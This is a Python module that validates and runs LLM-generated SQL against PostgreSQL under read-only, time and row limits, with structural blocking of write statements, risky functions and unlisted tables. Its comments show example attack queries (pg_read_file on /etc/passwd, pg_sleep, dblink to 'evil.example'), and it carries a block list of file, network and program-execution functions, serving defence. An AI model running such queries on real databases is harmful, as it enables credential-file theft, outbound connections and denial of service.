import os
import re

from dotenv import load_dotenv
from sqlalchemy import create_engine, text
from sqlalchemy.exc import SQLAlchemyError

import sqlglot
from sqlglot import exp


# ============================================================
# CONFIG
# ============================================================

load_dotenv()

DATABASE_URL = os.getenv("ANALYTICAL_DB")

if not DATABASE_URL:
    raise ValueError(
        "ANALYTICAL_DB is not defined in .env"
    )


# ============================================================
# DATABASE
# ============================================================

engine = create_engine(
    DATABASE_URL,
    pool_pre_ping=True,
)


# ============================================================
# SAFETY LIMITS
#
# These are enforced in CODE, not just in the LLM prompt.
# The prompt can be ignored by the model (or bypassed via
# prompt injection in the user question) — these limits
# cannot.
# ============================================================

DEFAULT_ROW_LIMIT = 100
MAX_ROW_LIMIT = 500          # hard ceiling, no caller can exceed this
STATEMENT_TIMEOUT_MS = 10_000  # kill any query that runs longer than this

SQL_DIALECT = "postgres"


# ============================================================
# BLOCKED SQL — statement types
#
# These are checked structurally on the parsed tree, not with
# a regex over the raw SQL text. A text/keyword search would
# either:
#   - false-positive on legitimate data, e.g.
#       SELECT status FROM t WHERE status = 'DELETE'
#   - or, if scoped only to the top-level statement, miss a
#     writable CTE such as:
#       WITH t AS (DELETE FROM x RETURNING *) SELECT * FROM t
#     ...which parses as a top-level SELECT while still
#     performing a DELETE.
#
# Walking the whole tree for these node types catches the
# writable-CTE case while leaving string literals alone.
# ============================================================

BLOCKED_STATEMENT_TYPES = (
    exp.Insert,
    exp.Update,
    exp.Delete,
    exp.Drop,
    exp.Alter,
    exp.Create,
    exp.TruncateTable,
    exp.Grant,
    exp.Revoke,
    exp.Command,   # catches VACUUM / ANALYZE / COMMENT / misc DDL
)


# ============================================================
# BLOCKED SQL — functions
#
# These are all legal to call from inside a plain SELECT, so
# the keyword blocklist above never sees them. Each one is a
# real way to turn a "read-only SELECT" into file access,
# network access, or a denial-of-service:
#
#   SELECT pg_read_file('/etc/passwd');
#   SELECT pg_sleep(999999);
#   SELECT * FROM dblink('host=evil.example', 'select 1');
# ============================================================

BLOCKED_FUNCTIONS = {
    "pg_sleep",
    "pg_read_file",
    "pg_read_binary_file",
    "pg_ls_dir",
    "pg_stat_file",
    "pg_relation_filepath",
    "lo_import",
    "lo_export",
    "dblink",
    "dblink_connect",
    "dblink_exec",
    "pg_terminate_backend",
    "pg_cancel_backend",
    "pg_reload_conf",
    "pg_read_server_files",
    "set_config",
    "current_setting",
    "pg_write_file",
    "copy_from_program",
    "copy_to_program",
}


# ============================================================
# CLEAN LLM OUTPUT
# ============================================================

def clean_sql(sql: str) -> str:

    if not sql:
        raise ValueError(
            "LLM returned empty SQL"
        )

    sql = sql.strip()

    # Remove markdown fences if the model ignored the prompt.
    sql = re.sub(
        r"^```(?:sql)?\s*",
        "",
        sql,
        flags=re.IGNORECASE,
    )

    sql = re.sub(
        r"\s*```$",
        "",
        sql,
        flags=re.IGNORECASE,
    )

    sql = sql.strip()

    if sql == "CANNOT_ANSWER":
        raise ValueError(
            "LLM returned CANNOT_ANSWER"
        )

    return sql


# ============================================================
# PARSE (single source of truth for structure)
# ============================================================

def _parse_single_statement(sql: str) -> exp.Expression:

    try:
        parsed = sqlglot.parse(sql, read=SQL_DIALECT)
    except Exception as e:
        raise ValueError(
            f"SQL could not be parsed: {e}"
        ) from e

    # sqlglot.parse can return None entries for empty statements
    # (e.g. a trailing ";").
    statements = [s for s in parsed if s is not None]

    if len(statements) != 1:
        raise ValueError(
            "Only one SQL statement is allowed"
        )

    return statements[0]


# ============================================================
# TABLE ALLOW-LIST ENFORCEMENT
#
# The system prompt tells the LLM which tables it may use, but
# a prompt is not an access-control mechanism: a hallucinated
# table name, or a crafted user question that manipulates the
# model, can still make it past a prompt-only check. This is a
# second, code-level gate that runs on the actual parsed query.
# ============================================================

def _check_allowed_tables(tree: exp.Expression, allowed_tables) -> None:

    if allowed_tables is None:
        return

    allowed_qualified = {
        name.lower()
        for name in allowed_tables
    }

    allowed_bare = {}

    for name in allowed_tables:

        bare = name.split(".")[-1].lower()

        allowed_bare.setdefault(
            bare, set()
        ).add(name.lower())

    not_allowed = set()

    for table in tree.find_all(exp.Table):

        if table.db:

            qualified = f"{table.db}.{table.name}".lower()

            if qualified not in allowed_qualified:
                not_allowed.add(qualified)

        else:

            bare = table.name.lower()

            if bare not in allowed_bare:
                not_allowed.add(bare)

    if not_allowed:
        raise ValueError(
            "Query references tables outside the allowed "
            f"schema: {', '.join(sorted(not_allowed))}"
        )


# ============================================================
# READ-ONLY VALIDATION
# ============================================================

def validate_sql(
    sql: str,
    allowed_tables=None,
) -> str:

    sql = clean_sql(sql)

    tree = _parse_single_statement(sql)

    # --------------------------------------------------------
    # Must be a SELECT (WITH ... SELECT parses as a Select
    # node with a CTE attached, so this also covers WITH).
    # --------------------------------------------------------

    if not isinstance(tree, (exp.Select, exp.Union)):
        raise ValueError(
            "Only SELECT/WITH queries are allowed"
        )

    # --------------------------------------------------------
    # Block dangerous statement types anywhere in the tree
    # (including inside a writable CTE — see comment above).
    # --------------------------------------------------------

    nested_dml = tree.find(
        BLOCKED_STATEMENT_TYPES
    )

    if nested_dml is not None:
        raise ValueError(
            "Blocked SQL operation: "
            f"{nested_dml.__class__.__name__.upper()}"
        )

    # --------------------------------------------------------
    # Block dangerous function calls (pg_sleep, pg_read_file,
    # dblink, ...). These are ordinary SELECT-list expressions,
    # so the keyword check above never sees them.
    # --------------------------------------------------------

    called_functions = set()

    for node in tree.find_all((exp.Func, exp.Anonymous)):

        name = getattr(node, "name", None) or getattr(node, "this", None)

        if isinstance(name, str):
            called_functions.add(name.lower())

    blocked_calls = called_functions.intersection(
        BLOCKED_FUNCTIONS
    )

    if blocked_calls:
        raise ValueError(
            f"Blocked function call: "
            f"{', '.join(sorted(blocked_calls))}"
        )

    # --------------------------------------------------------
    # Enforce table allow-list (defense in depth).
    # --------------------------------------------------------

    _check_allowed_tables(
        tree,
        allowed_tables,
    )

    return tree.sql(dialect=SQL_DIALECT)


# ============================================================
# ENFORCE ROW LIMIT (actually applied, not just documented)
# ============================================================

def _apply_row_limit(
    tree: exp.Expression,
    limit: int,
) -> exp.Expression:

    existing_limit = tree.args.get("limit")

    if existing_limit is not None:

        try:
            existing_value = int(
                existing_limit.expression.this
            )
        except Exception:
            existing_value = None

        if existing_value is None or existing_value > limit:
            return tree.limit(limit)

        return tree

    return tree.limit(limit)


# ============================================================
# EXECUTE
# ============================================================

def execute_sql(
    sql: str,
    limit: int = DEFAULT_ROW_LIMIT,
    allowed_tables=None,
):

    # A caller can never request more than MAX_ROW_LIMIT rows,
    # regardless of what value it passes in.
    limit = max(1, min(limit, MAX_ROW_LIMIT))

    validated_sql = validate_sql(
        sql,
        allowed_tables=allowed_tables,
    )

    tree = sqlglot.parse_one(
        validated_sql,
        read=SQL_DIALECT,
    )

    tree = _apply_row_limit(
        tree,
        limit,
    )

    final_sql = tree.sql(dialect=SQL_DIALECT)

    # --------------------------------------------------------
    # Execute inside a read-only, time-bounded transaction.
    # --------------------------------------------------------

    try:

        with engine.connect() as connection:

            connection.execute(
                text(
                    "SET TRANSACTION READ ONLY"
                )
            )

            connection.execute(
                text(
                    f"SET LOCAL statement_timeout = "
                    f"{STATEMENT_TIMEOUT_MS}"
                )
            )

            result = connection.execute(
                text(final_sql)
            )

            # fetchmany caps how many rows are ever pulled into
            # memory, even if the LIMIT above were somehow lost.
            rows = result.fetchmany(limit)

            columns = list(
                result.keys()
            )

            return {
                "sql": final_sql,
                "columns": columns,
                "rows": [
                    list(row)
                    for row in rows
                ],
                "row_count": len(rows),
            }

    except SQLAlchemyError as e:

        raise RuntimeError(
            f"PostgreSQL execution failed: {e}"
        ) from e


# ============================================================
# CLI TEST
# ============================================================

if __name__ == "__main__":

    print("=" * 70)
    print("SQL VALIDATOR + POSTGRES TEST")
    print("=" * 70)

    while True:

        sql = input(
            "\nEnter SQL "
            "(type 'exit' to quit): "
        ).strip()

        if sql.lower() in {
            "exit",
            "quit",
        }:
            break

        try:

            print("\nVALIDATING...")

            validated_sql = validate_sql(
                sql
            )

            print(
                "\nVALID SQL:"
            )

            print(validated_sql)

            print(
                "\nEXECUTING..."
            )

            result = execute_sql(
                validated_sql
            )

            print(
                f"\nRows returned: "
                f"{result['row_count']}"
            )

            print(
                "\nColumns:"
            )

            print(
                result["columns"]
            )

            print(
                "\nRows:"
            )

            for row in result["rows"]:
                print(row)

        except Exception as e:

            print(
                "\nERROR:"
            )

            print(e)
